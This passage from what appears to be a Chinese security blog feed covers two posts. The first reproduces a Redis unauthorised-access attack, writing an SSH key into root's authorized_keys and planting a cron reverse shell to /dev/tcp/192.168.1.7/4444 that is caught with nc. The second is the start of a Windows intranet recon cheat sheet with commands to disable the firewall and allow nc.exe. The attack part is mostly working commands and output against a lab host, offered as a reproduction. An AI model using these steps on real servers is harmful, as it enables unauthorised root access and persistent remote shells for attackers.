class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(gather/redis_extractor) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/gather/redis_extractor):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   THREADS   1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(gather/redis_extractor) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.9:6379      - Connected to Redis version 4.0.0</span><br><span class="line">[*] 192.168.1.9:6379      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(gather/redis_extractor) &gt;</span><br></pre></td></tr></table></figure><h4 id="03-å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•"><a href="#03-å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•" class="headerlink" title="03.å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•"></a>03.<strong>å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•</strong></h4><blockquote><p>åŸç†å°±æ˜¯åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†æœ¬æœºçš„å…¬é’¥ä½œä¸ºvalue,keyå€¼éšæ„ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized.keys,æŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯çš„/root/.sshä¸‹ç”Ÿä¸€ä¸ªæˆæƒçš„keyã€‚</p></blockquote><p><code>kaliå…ˆç”Ÿæˆsshå…¬é’¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ssh-keygen -t rsa                                                                                                                                     1 â¨¯</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa):</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:v7Cz1OKpvm8nlkBgWEmfcXmle+dprjPETRabUpr2pYk root@kali</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|   +o.. .. ..    |</span><br><span class="line">|  . +. +. ..  o  |</span><br><span class="line">|   . .o  ..  + + |</span><br><span class="line">|      .    .= = .|</span><br><span class="line">|     .  S .o.B.+ |</span><br><span class="line">|      .  o .Eo=. |</span><br><span class="line">|       .+.o.  +  |</span><br><span class="line">|       o*=..oo   |</span><br><span class="line">|     .+**=. .+.  |</span><br><span class="line">+----[SHA256]-----+</span><br></pre></td></tr></table></figure><p><code>å°†å…¬é’¥å†™å…¥key.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# (echo -e &quot;\n&quot;;cat /root/.ssh/id_rsa.pub;echo -e &quot;\n&quot;)&gt;key.txt</span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# cat key.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPQNEvzuCM3mruZvGSf1h6N56NItvVRApcAcPZQqsG8hnTmQCqPMucVqVNJEaPn9/EcOLayXtPkiS8HjEqUBg3OqMJS7YdCedx89uUk2zD4MxbBY4HjBn0zRgtDlGBbopDPnbPIok1jM9agFsHp3hJUlspBHMvKha6iZOGZZOAnjy/Aa4VV9u/idPhpqyIdXKv+EsJ/hgKP27kgxc+sFmm0AUj+KrhoIc7Ah5lW14w+GRSIpxcYfU3Fv9qydOm4bJ4HR/8Fqq15VLUpkfLy93okLDaaK1FZYyQ9cF+2dvrn9hcCFvxX8fQ7D6Xi3AxsWt3L4dWioM9CmEeSCa/vqP3IiAI2rkbq5A6uW+ydDE16OTgDEPQjjInqfy5T/jrqb2OeBaJ4ro7cr04hQWJ/PO6a9+XlW3kEYnb2kdJy3AgBOFAOyhdzY20/8frUJLEyQix6TKC9JCqOp3uGY2z33KseJzPka6tC+Dzco0Y010WQMutneRf+Li5YADJagHPBWU= root@kali</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>å°†key.txtå†™å…¥redisç¼“å†²åŒº</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# cat key.txt | redis-cli -h 192.168.1.9 -x set key</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">è¿™é‡Œå¯èƒ½éœ€è¦å…³é—­RDBæŒä¹…åŒ– 192.168.1.9:6379&gt; config <span class="built_in">set</span> stop-writes-on-bgsave-error no</span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ssh -i /root/.ssh/id_rsa root@192.168.1.9</span><br><span class="line">Last login: Sun Jul 18 23:57:55 2021 from 192.168.1.7</span><br><span class="line">[root@mail ~]#</span><br></pre></td></tr></table></figure><h4 id="04-cornå®šæ—¶ä»»åŠ¡åå¼¹shell"><a href="#04-cornå®šæ—¶ä»»åŠ¡åå¼¹shell" class="headerlink" title="04.cornå®šæ—¶ä»»åŠ¡åå¼¹shell"></a>04.cornå®šæ—¶ä»»åŠ¡åå¼¹shell</h4><p><code>kaliç›‘å¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>kaliç™»å…¥rediså†™å…¥åå¼¹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt; set demo &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.7/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; config set dir /var/spool/cron</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">å‰åç”¨\næ¢è¡Œï¼Œé¿å…å’Œredisé‡Œå…¶ä»–ç¼“å­˜æ•°æ®æ··åˆ</span></span><br></pre></td></tr></table></figure><p><code>å¾—åˆ°shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.1.7] from (UNKNOWN) [192.168.1.9] 35030</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">[root@mail ~]#</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Redisæœªæˆæƒè®¿é—®æ¼æ´&quot;&gt;&lt;a href=&quot;#Redisæœªæˆæƒè®¿é—®æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;Redisæœªæˆæƒè®¿é—®æ¼æ´&quot;&gt;&lt;/a&gt;Redisæœªæˆæƒè®¿é—®æ¼æ´&lt;/h1&gt;&lt;h2 id=&quot;ä¸€ã€æ¼æ´ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ä¸€ã€æ¼æ´ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ã€æ¼æ´ç®€ä»‹&quot;&gt;&lt;/a&gt;ä¸€ã€æ¼æ´ç®€ä»‹&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Redisé»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨0.0.0.0:6379(åœ¨redis3.2ä¹‹åï¼Œrediså¢åŠ äº†protected-modeï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œéç»‘å®šIPæˆ–è€…æ²¡æœ‰é…ç½®å¯†ç è®¿é—®æ—¶éƒ½ä¼šæŠ¥é”™)ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç­‰ï¼Œè¿™æ ·å°†ä¼šå°†RedisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯(é»˜è®¤ä¸ºç©º)çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—®Redisä»¥åŠè¯»å–Redisçš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—®Redisçš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨Redisè‡ªèº«çš„æä¾›çš„configå‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…è¿˜å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„/root/.sshæ–‡ä»¶çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡å™¨ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚&lt;/p&gt;
&lt;p&gt;æ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹:&lt;/p&gt;
&lt;p&gt;(1)  Redisç»‘å®šåœ¨0.0.0.0:6379,ä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘&lt;/p&gt;
&lt;p&gt;(2)  æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆé»˜è®¤ä¸ºç©ºï¼‰æˆ–è€…å¼±å¯†ç ï¼Œå¯ä»¥å…å¯†ç ç™»å½•redisæœåŠ¡&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Redis" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis/"/>
    
    
    <category term="Redis" scheme="https://lunamoore.github.io/tags/Redis/"/>
    
    <category term="è°ƒæ•™" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€æµ‹è¯•-ä¿¡æ¯æ”¶é›†</title>
    <link href="https://lunamoore.github.io/2021/07/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://lunamoore.github.io/2021/07/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-07-17T10:39:19.000Z</published>
    <updated>2021-07-17T10:56:12.337Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-å·¥ä½œç»„ä¿¡æ¯æ”¶é›†"><a href="#0x01-å·¥ä½œç»„ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.å·¥ä½œç»„ä¿¡æ¯æ”¶é›†"></a>0x01.å·¥ä½œç»„ä¿¡æ¯æ”¶é›†</h2><h3 id="01-æ£€æµ‹å½“å‰shellæƒé™"><a href="#01-æ£€æµ‹å½“å‰shellæƒé™" class="headerlink" title="01.æ£€æµ‹å½“å‰shellæƒé™"></a>01.æ£€æµ‹å½“å‰shellæƒé™</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /user    #æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„SID</span><br><span class="line">whoami /priv    #æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„å®‰å…¨æƒé™</span><br><span class="line">whoami /all</span><br></pre></td></tr></table></figure><h3 id="02-æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯"><a href="#02-æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="02.æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯"></a>02.æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><h3 id="03-tcp-udp-ç½‘ç»œè¿æ¥çŠ¶æ€"><a href="#03-tcp-udp-ç½‘ç»œè¿æ¥çŠ¶æ€" class="headerlink" title="03.tcp/udp ç½‘ç»œè¿æ¥çŠ¶æ€"></a>03.tcp/udp ç½‘ç»œè¿æ¥çŠ¶æ€</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nao</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="04-ä¸»æœºå"><a href="#04-ä¸»æœºå" class="headerlink" title="04.ä¸»æœºå"></a>04.ä¸»æœºå</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure><h3 id="05-å½“å‰æ“ä½œç³»ç»Ÿç‰ˆæœ¬"><a href="#05-å½“å‰æ“ä½œç³»ç»Ÿç‰ˆæœ¬" class="headerlink" title="05.å½“å‰æ“ä½œç³»ç»Ÿç‰ˆæœ¬"></a>05.å½“å‰æ“ä½œç³»ç»Ÿç‰ˆæœ¬</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ver</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS name&quot; /C:&quot;OS Version&quot;    #è‹±æ–‡ç‰ˆ</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS åç§°&quot; /C:&quot;OS ç‰ˆæœ¬&quot;    #ä¸­æ–‡ç‰ˆ</span><br><span class="line">wmic OS GET Caption,CSDVersion,OSArchitecture,Version    #æ›´è¯¦ç»†</span><br></pre></td></tr></table></figure><h3 id="06-æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„"><a href="#06-æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„" class="headerlink" title="06.æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„"></a>06.æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><h3 id="07-æŸ¥æ€è½¯"><a href="#07-æŸ¥æ€è½¯" class="headerlink" title="07.æŸ¥æ€è½¯"></a>07.æŸ¥æ€è½¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct GET displayName /Format:List</span><br></pre></td></tr></table></figure><h3 id="08-æŸ¥çœ‹å®‰è£…çš„ç¨‹åº"><a href="#08-æŸ¥çœ‹å®‰è£…çš„ç¨‹åº" class="headerlink" title="08.æŸ¥çœ‹å®‰è£…çš„ç¨‹åº"></a>08.æŸ¥çœ‹å®‰è£…çš„ç¨‹åº</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product get  name,version</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><h3 id="09-æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·"><a href="#09-æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·" class="headerlink" title="09.æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·"></a>09.æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">quser</span><br><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><h3 id="10-æŸ¥çœ‹ç½‘ç»œé…ç½®"><a href="#10-æŸ¥çœ‹ç½‘ç»œé…ç½®" class="headerlink" title="10.æŸ¥çœ‹ç½‘ç»œé…ç½®"></a>10.æŸ¥çœ‹ç½‘ç»œé…ç½®</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><h3 id="11-æŸ¥çœ‹è¿›ç¨‹ä¸ä¿¡æ¯"><a href="#11-æŸ¥çœ‹è¿›ç¨‹ä¸ä¿¡æ¯" class="headerlink" title="11.æŸ¥çœ‹è¿›ç¨‹ä¸ä¿¡æ¯"></a>11.æŸ¥çœ‹è¿›ç¨‹ä¸ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><h3 id="12-æŸ¥çœ‹å½“å‰ç™»å…¥åŸŸ"><a href="#12-æŸ¥çœ‹å½“å‰ç™»å…¥åŸŸ" class="headerlink" title="12.æŸ¥çœ‹å½“å‰ç™»å…¥åŸŸ"></a>12.æŸ¥çœ‹å½“å‰ç™»å…¥åŸŸ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><h3 id="13-è¿œç¨‹æ¡Œé¢å†å²è¿æ¥è®°å½•"><a href="#13-è¿œç¨‹æ¡Œé¢å†å²è¿æ¥è®°å½•" class="headerlink" title="13.è¿œç¨‹æ¡Œé¢å†å²è¿æ¥è®°å½•"></a>13.è¿œç¨‹æ¡Œé¢å†å²è¿æ¥è®°å½•</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /l</span><br></pre></td></tr></table></figure><h3 id="14-æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨"><a href="#14-æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨" class="headerlink" title="14.æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨"></a>14.æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><h3 id="15-æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯"><a href="#15-æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="15.æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯"></a>15.æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator</span><br></pre></td></tr></table></figure><h3 id="16-æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯"><a href="#16-æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯" class="headerlink" title="16.æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯"></a>16.æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><h3 id="17-æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯"><a href="#17-æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯" class="headerlink" title="17.æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯"></a>17.æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><h3 id="18-æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"><a href="#18-æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡" class="headerlink" title="18.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"></a>18.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><h3 id="19-æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´"><a href="#19-æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´" class="headerlink" title="19.æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´"></a>19.æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><h3 id="20-è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯-é€šå¸¸åŒ…æ‹¬åŸŸç”¨æˆ·"><a href="#20-è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯-é€šå¸¸åŒ…æ‹¬åŸŸç”¨æˆ·" class="headerlink" title="20.è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯[é€šå¸¸åŒ…æ‹¬åŸŸç”¨æˆ·]"></a>20.è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯[é€šå¸¸åŒ…æ‹¬åŸŸç”¨æˆ·]</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><h3 id="21-æ˜¾ç¤ºè¿æ¥ä¼šè¯"><a href="#21-æ˜¾ç¤ºè¿æ¥ä¼šè¯" class="headerlink" title="21.æ˜¾ç¤ºè¿æ¥ä¼šè¯"></a>21.æ˜¾ç¤ºè¿æ¥ä¼šè¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="22-æŸ¥çœ‹å®‰è£…è¿‡çš„è¡¥ä¸"><a href="#22-æŸ¥çœ‹å®‰è£…è¿‡çš„è¡¥ä¸" class="headerlink" title="22.æŸ¥çœ‹å®‰è£…è¿‡çš„è¡¥ä¸"></a>22.æŸ¥çœ‹å®‰è£…è¿‡çš„è¡¥ä¸</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><h3 id="23-æŸ¥çœ‹å…±äº«åˆ—è¡¨"><a href="#23-æŸ¥çœ‹å…±äº«åˆ—è¡¨" class="headerlink" title="23.æŸ¥çœ‹å…±äº«åˆ—è¡¨"></a>23.æŸ¥çœ‹å…±äº«åˆ—è¡¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net sharewmic share get name,path,status</span><br></pre></td></tr></table></figure><h3 id="24-æŸ¥çœ‹è·¯ç”±è¡¨ä¸ARPç¼“å­˜è¡¨"><a href="#24-æŸ¥çœ‹è·¯ç”±è¡¨ä¸ARPç¼“å­˜è¡¨" class="headerlink" title="24.æŸ¥çœ‹è·¯ç”±è¡¨ä¸ARPç¼“å­˜è¡¨"></a>24.æŸ¥çœ‹è·¯ç”±è¡¨ä¸ARPç¼“å­˜è¡¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route printarp -a</span><br></pre></td></tr></table></figure><h3 id="25-é˜²ç«å¢™ç›¸å…³"><a href="#25-é˜²ç«å¢™ç›¸å…³" class="headerlink" title="25.é˜²ç«å¢™ç›¸å…³"></a>25.é˜²ç«å¢™ç›¸å…³</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable    #server 2003ä¹‹å‰ç‰ˆæœ¬å…³é—­é˜²ç«å¢™netsh advfirewall set allprofiles state off #server 2003ä¹‹åç‰ˆæœ¬å…³é—­é˜²ç«å¢™netsh firewall show config    #æŸ¥çœ‹é˜²ç«å¢™é…ç½®netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable    #server 